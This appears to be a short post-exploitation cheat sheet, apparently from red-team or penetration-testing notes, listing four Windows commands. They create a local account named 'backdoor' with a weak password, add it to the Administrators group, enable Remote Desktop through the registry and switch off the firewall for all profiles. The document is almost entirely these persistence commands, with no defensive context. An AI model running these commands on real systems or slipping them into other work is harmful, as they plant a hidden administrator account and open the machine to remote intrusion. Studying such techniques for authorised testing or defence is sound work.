# Add new user
```shell
net user /add backdoor Password1
```

# Add new user to Administrators group
```shell
net localgroup administrators /add backdoor
```

# Enable RDP using registry
```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```

# Turn off firewall
```shell
netsh advfirewall set allprofiles state off
```